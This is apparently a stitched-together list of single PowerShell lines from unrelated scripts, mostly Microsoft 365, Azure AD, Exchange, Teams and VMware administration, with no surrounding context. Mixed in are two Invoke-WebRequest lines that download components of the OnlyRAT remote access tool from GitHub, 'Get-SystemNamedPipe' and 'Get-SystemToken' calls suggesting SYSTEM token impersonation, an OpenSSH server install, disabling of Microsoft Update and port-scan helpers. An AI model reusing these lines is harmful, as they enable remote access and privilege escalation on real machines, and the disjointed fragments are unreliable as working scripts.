Get-LocalUser -Name "Administrator"
Get-Credential -Message "Enter your mrfk admin credentials" | Export-Clixml $admCredsPath
Start-Job -ScriptBlock $scriptBlok -ArgumentList $dcucli , $xmlcatalog
Start-Job -ScriptBlock ${function:DownloadWithRetry} -ArgumentList $url , $filePath , 5
Add-Content $installScript "Start-Process -Wait -FilePath `"$filePath`" -ArgumentList `"/s`", `"/l=```"$filePath.log```"`""
Remove-Job -State Completed
Install-Module -Name AzureADPreview -AllowClobber -Verbose -Force
Connect-AzureAD -AccountId "tom@tomscloud.ch"
Install-Module -Name AzureAD -AllowClobber -Verbose -Force
Get-AzureADUser
Set-Location C:\
Get-AzureADUser
Get-AzureADUser | Where { $_ . UserType -eq "Member" }
Get-AzureADUser | Where { $_ . Department -eq "Technik" }
Get-AzureADUser -ObjectId tom@tomscloud.ch | Format-List
New-AzureADUser -GivenName "Fred" ` -Surname "Prefect" ` -DisplayName "Freddy Prefect" ` -UserPrincipalName "fred.prefect@tomscloud.ch" ` -MailNickName "Fred" ` -AccountEnabled $true ` -PasswordProfile $PasswordProfile ` -JobTitle "IT Administrator" ` -Department "IT"
Set-AzureADUser ` -ObjectId fred.prefect@tomscloud.ch ` -DisplayName “Fred Prefect"
Set-AzureADUserManager ` -ObjectId fred.prefect@tomscloud.ch ` -RefObjectId ( Get-AzureADUser -ObjectId jane.ford@tomscloud.ch ) . ObjectId
Get-AzureADUser -Filter "Displayname eq 'Fred Jonas'" | Select-Object Displayname , State , Department
Get-AzureADGroup
Get-AzureADGroupMember ` -ObjectId ( Get-AzureADGroup -SearchString "Technik" ) . ObjectId
Get-AzureADGroupOwner ` -ObjectId ( Get-AzureADGroup -SearchString "Technik" ) . ObjectId
Add-AzureADGroupOwner ` -ObjectId ( Get-AzureADGroup -SearchString "Technik" ) . ObjectId ` -RefObjectId ( Get-AzureADUser -ObjectId fred.prefect@tomscloud.ch ) . ObjectId
Get-AzureADSubscribedSku
Get-AzureADSubscribedSku | Select-Object -Property ObjectId , SkuPartNumber , ConsumedUnits -ExpandProperty PrepaidUnits
Get-AzureADSubscribedSku ` -ObjectId 95b14fab-6bbf-4756-94d4-99993dd27f55_05e9a617-0261-4cee-bb44-138d3ef5d965 | Select-Object -ExpandProperty ServicePlans
Get-AzureAdUser | ForEach { $licensed = $False ; For ( $i = 0 ; $i -le ( $_ . AssignedLicenses | Measure ) . Count ; $i ++ ) ` { If ( [ string ] :: IsNullOrEmpty ( $_ . AssignedLicenses [ $i ] . SkuId ) -ne $True ) { $licensed = $true } } ; If ( $licensed -eq $true ) ` { Write-Host $_ . UserPrincipalName } }
Get-AzureAdUser | ForEach { $licensed = $False ; For ( $i = 0 ; $i -le ( $_ . AssignedLicenses | Measure ) . Count ; $i ++ ) ` { If ( [ string ] :: IsNullOrEmpty ( $_ . AssignedLicenses [ $i ] . SkuId ) -ne $True ) { $licensed = $true } } ; If ( $licensed -eq $false ) ` { Write-Host $_ . UserPrincipalName } }
Get-AzureADUser | Select DisplayName , Department , UsageLocation
Set-AzureADUser -ObjectId $User . ObjectId -UsageLocation CH
Get-AzureADSubscribedSku | Select SkuPartNumber , SkuID
Set-AzureADUserLicense -ObjectId $User . ObjectId -AssignedLicenses $Licenses
Get-AzureADSubscribedSku -ObjectId 95b14fab-6bbf-4756-94d4-99993dd27f55_05e9a617-0261-4cee-bb44-138d3ef5d965 | Select-Object -ExpandProperty ServicePlans
Set-AzureADUserLicense -ObjectId $User . ObjectId -AssignedLicenses $Licenses
Install-Module -Name Microsoft.Online.SharePoint.PowerShell -Force -Verbose
Connect-SPOService ` -Url https://tomscloud-admin.sharepoint.com ` -Credential $cred
Disconnect-SPOService
Get-SPOSite -Identity https://tomscloud.sharepoint.com/ | Format-List *
Get-SPOWebTemplate
New-SPOSite –Url https://tomscloud.sharepoint.com/sites/sales –Owner tom@tomscloud.ch –StorageQuota 400 –Title “Verkaufs Team”
Remove-SPOSite -Identity https://tomscloud.sharepoint.com/sites/sales -NoWait
Get-SPODeletedSite
Restore-SPODeletedSite -Identity https://tomscloud.sharepoint.com/sites/sales
Get-SPOSite -Template GROUP#0
New-SPOSite ` -Url https://tomscloud.sharepoint.com/sites/TestPSteamSite ` -Owner fred.jonas@tomscloud.ch ` -Title "Modern Stand Alone Team Site" ` -Template STS#3 ` -StorageQuota 10240
New-SPOSite ` -Url https://tomscloud.sharepoint.com/sites/TestPSCommSite ` -Owner fred.jonas@tomscloud.ch ` -Title "Communication Site" ` -Template SITEPAGEPUBLISHING#0 ` -StorageQuota 10240
Set-SPOSite ` -Identity https://tomscloud.sharepoint.com/sites/TestPSCommSite ` -Title "EMEA Sales" ` -SocialBarOnSitePagesDisabled $true ` -SharingCapability ExternalUserSharingOnly
Remove-SPOSite ` -Identity https://tomscloud.sharepoint.com/sites/TestPSCommSite ` -Confirm: $false
Restore-SPODeletedSite ` -Identity https://tomscloud.sharepoint.com/sites/TestPSCommSite
Register-SPOHubSite ` -Site https://tomscloud.sharepoint.com/sites/TestPSCommSite ` -Principals $null
Add-SPOHubSiteAssociation ` -Site https://tomscloud.sharepoint.com/sites/TestPSteamSite ` -HubSite https://tomscloud.sharepoint.com/sites/TestPSCommSite
Remove-PSSession $Session
Install-Module -Name ExchangeOnlineManagement -Verbose -AllowClobber -Force
Connect-ExchangeOnline –Credential $cred
Get-OrganizationConfig
Set-Mailbox -Identity fred.prefect ` -HiddenFromAddressListsEnabled $true ` -DeliverToMailboxAndForward $false ` -ForwardingAddress fred.jonas@tomrocks.ch
New-MailContact ` -Name "401K Questions" ` -ExternalEmailAddress companyname@tomticket.com
Set-MailboxAutoReplyConfiguration ` -Identity fred.jonas@tomrocks.ch ` -ExternalMessage $body ` -InternalMessage $body ` -AutoReplyState Enabled
Get-DistributionGroup
Add-DistributionGroupMember ` -Identity "Marketing" ` -Member "fred.jonas@tomrocks.ch"
Disable-MailUser $Identity -Confirm: $False
Enable-Mailbox -Identity $Identity -Alias $Alias
Set-ExecutionPolicy RemoteSigned
Install-Module -Name ExchangeOnlineManagement -Verbose -Force
Update-Module -Name ExchangeOnlineManagement -Verbose -Force
Connect-ExchangeOnline -UserPrincipalName admin365@wechsler2020.onmicrosoft.com
Get-Mailbox | Where-Object { $_ . ArchiveDatabase -ne $null }
Enable-Mailbox -Identity "tom@contosotom.ch" -Archive
Get-Mailbox -Filter { ArchiveStatus -Eq "None" -AND RecipientTypeDetails -eq "UserMailbox" } | Enable-Mailbox -Archive
Disable-Mailbox -Identity "tom@contosotom.ch" -Archive
Get-Mailbox -Filter { ArchiveStatus -Eq "Active" -AND RecipientTypeDetails -eq "UserMailbox" } | Disable-Mailbox -Archive
Get-EligibleDistributionGroupForMigration -ResultSize unlimited
New-ActiveSyncDeviceAccessRule -Characteristic DeviceType -QueryString "Android" -AccessLevel Block
Get-ActiveSyncDeviceAccessRule
Remove-ActiveSyncDeviceAccessRule -Identity "Android (DeviceType)"
Get-ActiveSyncDeviceAccessRule
Get-MessageTraceDetail -MessageTraceId fa111196-fd22-429f-1616-08d8b8948ac5 -RecipientAddress admin365@wechsler2020.onmicrosoft.com
XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X
Remove-HostedContentFilterPolicy -Identity "ContosoTom Executives"
Install-Module -Name MicrosoftTeams -AllowClobber -Verbose -Force
Connect-MicrosoftTeams –Credential $cred
Connect-MicrosoftTeams
Get-Team
New-Team -DisplayName “Patricks Team ist Cool” -Visibility Public
Get-Team -DisplayName "Logistik" | New-TeamChannel -DisplayName "Wartung" -Description "A channel for maintenance."
Get-Team -DisplayName "Logistik" | Get-TeamChannel
Get-Team -DisplayName "Logistik" | Set-TeamChannel -CurrentDisplayName "Wartung" -NewDisplayName "Maintenance2020"
Get-Team -DisplayName "Logistik" | Remove-TeamChannel -DisplayName "Maintenance2020"
New-Team ` -DisplayName "Accounting Team" ` -Description "Internal Collaboration place for the Accounting Team" ` -Visibility Private
Set-Team -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200 ` -Visibility Public ` -AllowChannelMentions $false ` -AllowCreateUpdateChannels $false ` -AllowUserDeleteMessages $false ` -AllowUserEditMessages $false ` -AllowGiphy $false ` -AllowStickersAndMemes $false
New-TeamChannel ` -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200 ` -DisplayName "Milestones” ` -MembershipType Private
Set-TeamChannel -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200 ` -CurrentDisplayName "Milestones" ` -NewDisplayName "Targets" ` -Description "Use this channel to share the project targets"
Get-TeamUser -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200 -Role Owner
Get-TeamUser -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200 -Role Member
Add-TeamUser -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200 ` -User fred.jonas@tomrocks.ch
Add-TeamUser -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200 ` -User fred.jonas@tomrocks.ch ` -Role Owner
Remove-Team -GroupId 6226df7e-9fa8-4814-8d20-7a9938b27200
Install-Module MicrosoftTeams -AllowClobber -Force -Verbose
Install-Module MSOnline -AllowClobber -Force -Verbose
Import-Module -Name MicrosoftTeams
Connect-MsolService –Credential $cred
Get-MsolUser
Get-MsolUser -UserPrincipalName "tom@tomscloud.ch" | Select-Object ObjectId
Get-CsUserPolicyAssignment -Identity ba36d788-31a5-4f72-9709-7d586056762c
Get-CsOnlineUser | Format-Table UserPrincipalName , TeamsMessagingPolicy , TeamsMeetingPolicy , TeamsAppSetupPolicy
Get-CsTeamsMessagingPolicy -Identity "Tom"
Grant-CsTeamsMessagingPolicy -Identity fred.jonas@tomscloud.ch -PolicyName "Tom"
Get-CsOnlineUser -Filter { Department -eq 'Administration' } | Select UserPrincipalName
Get-CsOnlineUser -Filter { Department -eq 'Administration' } | Grant-CsTeamsMessagingPolicy -PolicyName "Tom"
Get-CsOnlineUser -Filter { TeamsMessagingPolicy -eq 'Tom' } | Select UserPrincipalName
Get-CsOnlineUser | Format-Table UserPrincipalName , TeamsMessagingPolicy , TeamsMeetingPolicy , TeamsAppSetupPolicy
Get-CsOnlineUser -Filter { Department -eq 'Administration' } | Grant-CsTeamsMeetingPolicy -PolicyName $Null
Grant-CsTeamsMessagingPolicy -Identity fred.jonas@tomscloud.ch -PolicyName $null
New-RetentionPolicyTag “Archivierung” –Type All –RetentionEnabled $true –AgeLimitForRetention 180 –RetentionAction MoveToArchive
New-RetentionPolicyTag “Loeschen” –Type All –RetentionEnabled $true –AgeLimitForRetention 2555 –RetentionAction PermanentlyDelete
Install-Module MSOnline -AllowClobber -Force -Verbose
Connect-MsolService
Get-MsolUser | Get-Member
Get-MsolUser -All | where { $_ . IsLicensed -ne $null } | Select-Object -Property Displayname , UserPrincipalName
Get-MsolUser -All | where { $_ . IsLicensed -eq $false } | Select-Object -Property Displayname , UserPrincipalName
Get-MsolUser -All | Select DisplayName , UserPrincipalName , LastPasswordChangeTimeStamp
Get-MsolRole | Out-GridView
Get-MsolRole | % { $role = $_ . name ; Get-MsolRoleMember -RoleObjectId $_ . objectid } | select @{ Name = "Role" ; Expression = { $role } } , DisplayName , EmailAddress
Get-MsolRole | % { $role = $_ . name ; Get-MsolRoleMember -RoleObjectId $_ . objectid } | select @{ Name = "Role" ; Expression = { $role } } , DisplayName , EmailAddress | Sort-Object -Property Displayname
Get-MsolUser -All | where { $_ . StrongAuthenticationMethods -ne $null } | Select-Object -Property UserPrincipalName
Get-MsolUser -all | select DisplayName , UserPrincipalName , @{ N = "MFA Status" ; E = { if ( $_ . StrongAuthenticationMethods . IsDefault -eq $true ) { ( $_ . StrongAuthenticationMethods | Where IsDefault -eq $True ) . MethodType } else { "Disabled" } } } | FT -AutoSize
Get-MsolUser -UserPrincipalName jane.ford@tomwechsler.xyz | select DisplayName , UserPrincipalName , @{ N = "MFA Status" ; E = { if ( $_ . StrongAuthenticationMethods . IsDefault -eq $true ) { ( $_ . StrongAuthenticationMethods | Where IsDefault -eq $True ) . MethodType } else { "Disabled" } } } | FT -AutoSize
Set-MsolUser -UserPrincipalName tim.jones@tomwechsler.xyz -StrongAuthenticationRequirements $sta
Get-MsolUser -UserPrincipalName tim.jones@tomwechsler.xyz | Set-MsolUser -StrongAuthenticationRequirements @( )
Set-MsolUser -UserPrincipalName tim.taylor@tomwechsler.xyz -StrongAuthenticationRequirements @( )
New-Mailbox -Name ZMRoom -DisplayName "Zuerich Meeting Raum" -Room
New-Mailbox -Name "Mobiler Beamer" -Equipment
Install-Module PowershellGet -Force
Update-Module PowershellGet
Set-ExecutionPolicy RemoteSigned
Import-Module ExchangeOnlineManagement ; Get-Module ExchangeOnlineManagement
Update-Module -Name ExchangeOnlineManagement
Import-Module ExchangeOnlineManagement ; Get-Module ExchangeOnlineManagement
Uninstall-Module -Name ExchangeOnlineManagement
Connect-ExchangeOnline -Credential $UserCredential -ShowProgress $true
Connect-ExchangeOnline -UserPrincipalName < UPN> -ShowProgress $true
Get-EXOMailbox -PropertySets Archive , Custom
Get-EXOMailbox -Properties LitigationHoldEnabled , AuditEnabled
Get-EXOMailbox -ResultSize 10
Set-User -Identity tim.taylor@contosotom.ch -RemotePowerShellEnabled $false
Get-User -ResultSize unlimited | Format-Table -Auto Name , DisplayName , RemotePowerShellEnabled
Get-User -ResultSize unlimited -Filter 'RemotePowerShellEnabled -eq $false'
Get-User -ResultSize unlimited -Filter 'RemotePowerShellEnabled -eq $true'
Get-Mailbox
Get-mailbox "Stefan Hinz" | select -ExpandProperty emailaddresses
Get-Mailbox
New-Mailbox -Shared -Name "IT Support" -Alias ITSupport
Disconnect-ExchangeOnline -Confirm: $false
Install-Module -Name AzureAD -AllowClobber -Force -Verbose
Import-Module AzureAD
Connect-AzureAD -Credential $Cred | Out-Null
Get-AzureADMSGroup -Filter "groupTypes/any(c:c eq 'Unified')" -All: $true | ForEach-object {
Install-Module -Name MSOnline -AllowClobber -Force -Verbose
Import-Module -Name MSOnline
Connect-MsolService
Install-Module -Name ExchangeOnlineManagement -Force -Verbose
Install-Module -Name ExchangeOnlineManagement -RequiredVersion 2.0.5 -Force -Verbose
Import-Module ExchangeOnlineManagement
Get-InstalledModule -Name ExchangeOnlineManagement
Connect-ExchangeOnline -Credential $UserCredential
Connect-ExchangeOnline -UserPrincipalName tom@wechsler.cloud
Import-PSSession $Session -AllowClobber
New-UnifiedGroup -DisplayName "Study Group" -Alias "0365-Study-Group" ` -EmailAddresses "0365-Study-Group@tomwechsler.xyz" -AccessType Private
New-UnifiedGroup –DisplayName "ITBros Admins" -Alias "ITBrosAdmins" -AccessType Public
Get-UnifiedGroupLinks "ITBros Admins" –LinkType Member
Get-UnifiedGroupLinks "ITBros Admins" –LinkType Owner
Add-UnifiedGroupLinks –Identity "ITBros Admins" –LinkType Owner –Links tim.godin@tomwechsler.xyz
Add-UnifiedGroupLinks -Identity "ITBros Admins" –LinkType Members –Links Tim.Godin
Add-UnifiedGroupLinks –Identity "ITBros Admins" –LinkType Owner –Links tim.godin@tomwechsler.xyz
Get-ADForest | Format-List UPNSuffixes
Get-ADForest | Set-ADForest -UPNSuffixes @{ add = "tomrocks.ch" }
Get-ADUser -Filter * | Sort-Object Name | Format-Table Name , UserPrincipalName
Get-OrganizationConfig | Format-List Identity , IsDehydrated
Enable-OrganizationCustomization
Get-AdminAuditLogConfig | FL UnifiedAuditLogIngestionEnabled
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false
Get-AcceptedDomain | Format-List Domainname , *type*
Get-Mailbox -Identity jane.ford@tomrocks.ch | Format-List Identity , WhenCreated , ExchangeGUID
Get-Mailbox -InactiveMailboxOnly | FT DisplayName , PrimarySMTPAddress , WhenSoftDeleted
Get-Mailbox -InactiveMailboxOnly | Select Displayname , PrimarySMTPAddress , DistinguishedName , ExchangeGuid , WhenSoftDeleted | Export-Csv InactiveMailboxes.csv -NoType
Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Select-Object DisplayName , LastLogonTime
Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Where { $_ . Lastlogontime -lt ( Get-Date ) . AddDays ( -90 ) } | Select DisplayName , LastLoggedOnUserAccount , LastLogonTime
Connect-MsolService -Credential $credentials
Get-MsolUser -All -UnlicensedUsersOnly
Get-MsolUser -All | where { $_ . UsageLocation -eq $null }
Get-MsolUser -All | Format-Table DisplayName , Usagelocation -AutoSize
Get-MsolAccountSku
Set-MsolUser -UserPrincipalName "info@wechsler.onmicrosoft.com" -UsageLocation CH
Set-MsolUserLicense -UserPrincipalName "info@wechsler.onmicrosoft.com" -AddLicenses "wechsler:ENTERPRISEPREMIUM"
Get-MsolUser -All -UnlicensedUsersOnly | Set-MsolUserLicense -AddLicenses "wechsler:ENTERPRISEPREMIUM"
Get-MsolUser -All -Department "Administration" -UnlicensedUsersOnly | Select-Object DisplayName , UsageLocation , Islicensed
Get-MsolUser -All -Department "Administration" -UsageLocation "CH" -UnlicensedUsersOnly | Set-MsolUserLicense -AddLicenses "wechsler:ENTERPRISEPREMIUM"
Set-MsolUserLicense -UserPrincipalName jane.ford@tomwechsler.xyz -RemoveLicenses "wechsler:ENTERPRISEPREMIUM"
Install-Module -Name ExchangeOnlineManagement -AllowClobber -Force -Verbose
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -UserPrincipalName tom@tomrocks.ch
Get-Command -Name *OME*
Get-ManagementRoleEntry -Identity *\New-OMEConfiguration | ft -AutoSize
New-OMEConfiguration -Identity "Outlook.com"
Set-OMEConfiguration -Identity "Outlook.com" -BackgroundColor "#0000ff"
Set-OMEConfiguration -Identity "Outlook.com" -IntroductionText "has sent you a secure message."
Set-OMEConfiguration -Identity "Outlook.com" -SocialIdSignIn $false
Set-OMEConfiguration -Identity "Outlook.com" -OTPEnabled $true
Set-OMEConfiguration -Identity "Outlook.com" -ExternalMailExpiryInDays 7
Remove-OMEConfiguration -Identity "Outlook.com"
Install-Module -Name AzureAD -Force -AllowClobber -Verbose
Import-Module AzureAD
Connect-MsolService -Credential $cred
Connect-AzureAD -Credential $cred
Import-PSSession $exchange -AllowClobber
Get-MsolUser
Get-AcceptedDomain | Format-List Domainname , *type*
Get-OrganizationConfig | Select-Object MailTipsLargeAudienceThreshold
Get-RoleGroup "Recipient Management" | Format-List
Get-RoleGroup "Recipient Management" | Select-Object -ExpandProperty Roles
Get-RetentionPolicy
Get-RetentionPolicy -Identity "Default MRM Policy" | Format-List
Get-RetentionPolicy -Identity "Default MRM Policy" | Select-Object -ExpandProperty RetentionPolicyTagLinks
Import-Module ExchangeOnlineManagement
Write-Progress -Activity "Waiting for you to log in o365"
Install-Module ImportExcel -Scope CurrentUser -ErrorAction SilentlyContinue #Will install import excel module, otherwise it will not be possible to export to excel.
Get-EXOMailbox -ResultSize unlimited | select-object @{ n = 'Identity' ; e = { $_ . UserPrincipalName } } | Get-EXOMailboxPermission | Where-Object { -not ( $_ . User -like "NT AUTHORITY\SELF" ) } | Select-Object -Property PSShowComputerName , Deny , InheritanceType , User , UserSid , @{ n = 'AccessRights' ; e = { $_ . AccessRights -join ';' } } , @{ n = 'Target Mailbox' ; e = { $_ . Identity -join ';' } } , IsInherited , IsValid , ObjectState | Export-Excel $ExcelFile -AutoSize -StartRow 2 -TableName Report
Invoke-Item $ExcelFile
Disconnect-ExchangeOnline -Confirm: $false -InformationAction Ignore -ErrorAction SilentlyContinue
Remove-Variable * -ErrorAction SilentlyContinue ; Remove-Module * ; $error . Clear ( ) ; #Clear-Host
Disconnect-ExchangeOnline -Confirm: $false -InformationAction Ignore -ErrorAction SilentlyContinue
Test-OftenOnLab
Get-Content README.md # README
Invoke-ScriptAnalyzer .\Invoke-OKCommand.ps1 -ExcludeRule PSAvoidUsingWriteHost | ft -auto
test: Invoke-Pester # ALL tests
Invoke-Pester -Script .\Get-OKCommandLength.Tests.ps1
Invoke-Expression $command . commandText ;
Set-Alias ok Invoke-OK ;
Split-OKPascalWise $Name |
Show-OKName ( $scrap . Substring ( 1 ) ) -ForegroundColor $tokenColor -SecondForeGroundColor $secondTokenColor -NoNewline -DebugMode $debugMode ;
Show-OKToken $innerToken -charNumX: $innerToken . Extent . StartColumnNumber -debugMode: $debugMode -CommentOffset $CommentOffset -MaxKeyLength $MaxKeyLength ;
Write-OKScrap $token . Text . Substring ( $upTo - $tokenStartOffset ) $token $debugMode ;
Set-BoxstarterConfig -NugetSources "https://www.myget.org/F/fireeye/api/v2;https://chocolatey.org/api/v2"
Disable-MicrosoftUpdate
Remove-Item email.txt
Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/wrev.reg -OutFile "wrev.reg"
Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/calty.vbs -OutFile "calty.vbs"
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Import-Module $( Join-Path -Path ( Split-Path $MyInvocation . Mycommand . Path ) -ChildPath "lib/opendns-lib.ps1" )
Add-Type -AssemblyName System.Windows.Forms
Remove-Item -Path $tempJsonPath
Write-Progress @param
Start-Sleep -Seconds 0.1
start-process $fileExe $arguments -Wait -RedirectStandardError NUL
Add-Type -AssemblyName System.Windows.Forms
Disconnect-VIServer -Server $Configuration . VIServer -Force -Confirm: $false
Start-Sleep -Seconds 60
Write-Progress -Id 1 -Activity 'Creating Runspaces to test credentials' ` -Status "Creating runspaces for $VMTestCount VMs." -PercentComplete 0
Remove-Item -Path $ScriptOutput -Force
Get-RunspaceData
Get-JAMSFailoverStatus -Server mn5pifsejsw102
Set-JAMSFailoverStatus -Server mn5pifsejsw101 -Active
Get-JAMSFailoverStatus -Server mn5pifsejsw102
Get-ChildItem -Path $path -Recurse -Force | Where-Object { ! $_ . PSIsContainer -and $_ . CreationTime -lt $limit } | Remove-Item -Force -ErrorAction Continue
Rename-Item -Path $file . FullName -NewName $newName
Invoke-G3SQLCommand ` -ServerInstance "$ComputerName\G3SQL01" ` -Database "master" ` -Query "ALTER DATABASE [{$env:SuspectDatabase}] SET SINGLE_USER WITH ROLLBACK IMMEDIATE" ` -Credential $G3Properties . OPSCredentials . SQL
Invoke-G3SQLCommand ` -ServerInstance "$ComputerName\G3SQL01" ` -Database "master" ` -Query "DBCC CHECKDB([{$env:SuspectDatabase}], REPAIR_ALLOW_DATA_LOSS)" ` -Credential $G3Properties . OPSCredentials . SQL
Invoke-G3SQLCommand ` -ServerInstance "$ComputerName\G3SQL01" ` -Database "master" ` -Query "ALTER DATABASE [{$env:SuspectDatabase}] SET MULTI_USER" ` -Credential $G3Properties . OPSCredentials . SQL
Show-Menu
Set-OxyDefaultStyle ggplot
remove-item function:deactivate
copy-item env:PATH env:_OLD_VIRTUAL_PATH
Copy-Item -Path Env:PATH -Destination Env:_OLD_VIRTUAL_PATH
Get-Path C:\NotAUser | Should Be "C:\NotAUser"
get-path Public\* | Should Be $( convert-path Public\* )
get-path C:\Users\*\Documents , C:\Users\*\Desktop | Should Be $( convert-path C:\Users\*\Documents , C:\Users\*\Desktop )
get-path hklm:\software\microsoft | Should Be "HKEY_LOCAL_MACHINE\software\microsoft"
New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType DWORD -Force
Start-Sleep -s 1
Get-SystemNamedPipe -ServiceName $ServiceName -PipeName $PipeName
Get-SystemToken
Start-AzureRmVM -Name $vm . Name -ResourceGroupName $resourceGroup
Set-StrictMode -Version Latest
Copy-Item -Path @(
Import-Module -Name PlatyPS
Update-ModuleManifest -ModuleVersion $newVersion -Path .\PIMTools.psd1 -ReleaseNotes $ReleaseNotes
Set-Location $OriginalLocation
Add-Type -Path "$PSScriptRoot\assembly\Mono.Security.dll"
Rename-Item -Path $file . FullName -NewName ( $file . basename + '(Forced)' + $file . extension )
Rename-Item -Path $file . FullName -NewName ( $file . basename + '(SDH)' + $file . extension )
Set-Variable POKERED_TILESET -option Constant -value 1
Test-Path $env:windir
Move-Item asiosdk_*.*.*_*\ ASIOSDK
New-Alias -Name hexdump -Value Format-HexDump
Where-Object { $_ -like "$wordToComplete*" } |
open-text-inner $_ $_ . extension
favorite-text-editor
Invoke-Expression @" if (-Not $AnswerNumber) { Write-Host -ForegroundColor Red "$QuestionNumber`t" -NoNewLine } else { Write-Host -ForegroundColor Green "$QuestionNumber`t" -NoNewLine } "@
Export-ModuleMember ` -Function: (
Start-Process "file:///$temp"
Set-Content -Value $bytes -Path $OutFile -Encoding Byte
Install-PoshHostsModule $modulePath '$version$'
Remove-PoshHostsModule $modulePath
Export-ModuleMember -Function Hosts
Out-HostsFile -HostsMap $info
Out-HostsFile -Content ( [ string ] :: Empty ) -Message 'Hosts file cleared'
Get-HostsFileEntry -HostsMap $info -Value $_host -Type Hostname -State Enabled | ForEach-Object {
Get-HostsFileEntries -HostsMap $HostsMap -IP $IP -Hostname $Hostname -State Enabled | ForEach-Object {
Test-HostnameAgainstDifferentIP -HostsMap $HostsMap -IP $IP -Hostname $Hostname -Throw | Out-Null
Get-HostsFileEntries -HostsMap $HostsMap -IP $IP -Hostname $Hostname -State Disabled | ForEach-Object {
New-HostsFileBackup
Unregister-Event -SourceIdentifier "ServerEvent$($this.Id)" -Force -ErrorAction Ignore
Get-Content -Path $CompanyConfigPath | ConvertFrom-Json | ForEach-Object {
Start-Server -ServerId 1
Start-Server -ServerId 2
New-Object PSObject -Property @{
Remove-Variable TempCollection -ErrorAction SilentlyContinue
New-Alias -Name ssj -Value Start-RSJob -Force
Start-Sleep -Seconds 1
Remove-PSReadLineKeyHandler -Chord $global:previousKeybind
Set-ItemProperty -Type ExpandString -LiteralPath $regPath Path $newValue
Set-Variable -Name $variableName -Value $Response [ $i - 1 ] -Scope Script
Get-TopPort ( 50 ) | Out-Null
Write-PortscanOut -comment $startMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream
Test-Compliance -Entity $SHOST
Get-Compliance -Entity $SHOST
Get-Baseline -Name $SBASELINE | Update-Entity -Entity $SBASELINE -confirm: $false
Get-VM -Location esxi-1
Get-VM -Location esxi-1 | Where-Object { $_ . PowerState -eq "poweredon" }
Get-VM -Location esxi-1 | Where-Object { $_ . PowerState -eq "poweredon" -and $_ . Name -match $VMName }
Get-VM -Location esxi-1 | Where-Object { $_ . PowerState -eq "poweredon" } | ForEach-Object { Move-VM -VM $_ -Destination esxi-2 }
get-vdportgroup -server $Server2
Get-VDSwitch -server $Server2
Get-VDPortgroup -server $Server2 -vdswitch $Switch | Select-Object Name , VlanConfiguration
get-vm -server $server2 | ForEach-Object {
get-folder -server $server2 -type vm | foreach-object {
get-vm -server $server2 | foreach-object {
new-vm -Name $NewVM -VM $TemplateVM -Location $Location -Datastore $DS -ResourcePool $ResPool -RunAsync
Write-Progress -Activity 'Starting PowerRazzle' -PercentComplete 0
Write-Progress -Activity 'Starting PowerRazzle' -PercentComplete 10 -Status 'Declaring Functions'
Write-Progress -Activity 'Starting PowerRazzle' -PercentComplete 40 -Status 'Configuring Environment'
Add-Path ( $PSScriptRoot )
Export-ModuleMember -Function *
Get-ChildItem -Path . -Recurse -Depth 5
Remove-Item Invoke-CreateModuleHelpFile.ps1 -ErrorAction Ignore -Force
Register-ArgumentCompleter ` -Command ( 'Get-AppxPackage' ) ` -Parameter 'Name' ` -ScriptBlock $function:Appx_PackageNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-AppxPackage' ) ` -Parameter 'Publisher' ` -ScriptBlock $function:Appx_PackagePublisherArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-AppxPackage' ) ` -Parameter 'Path' ` -ScriptBlock $function:Appx_PathArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-AppxPackageManifest' , 'Remove-AppxPackage' ) ` -Parameter 'Package' ` -ScriptBlock $function:Appx_PackageManifestNameArgumentCompletion
Export-ModuleMember
Register-ArgumentCompleter ` -Command ( 'Get-BitsTransfer' ) ` -Parameter 'Name' ` -ScriptBlock $function:BitsTransfer_JobNameArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-BitsTransfer' ) ` -Parameter 'JobId' ` -ScriptBlock $function:BitsTransfer_JobIdArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Add-BitsFile' , 'Complete-BitsTransfer' , 'Remove-BitsTransfer' , 'Resume-BitsTransfer' , 'Set-BitsTransfer' , 'Suspend-BitsTransfer' ) ` -Parameter 'BitsJob' ` -ScriptBlock $function:BitsTransfer_BitsJobArgumentCompletion
Register-ArgumentCompleter ` -Command ( 'Get-CimInstance' , 'Invoke-CimMethod' , 'Register-CimIndicationEvent' , 'Remove-CimInstance,Set-CimInstance' ) ` -Parameter 'QueryDialect' ` -ScriptBlock $function:CimInstance_QueryDialectCompleter
Register-ArgumentCompleter ` -Command 'Get-CimInstance' ` -Parameter 'Property' ` -ScriptBlock $function:CimInstance_PropertyParameterCompleter
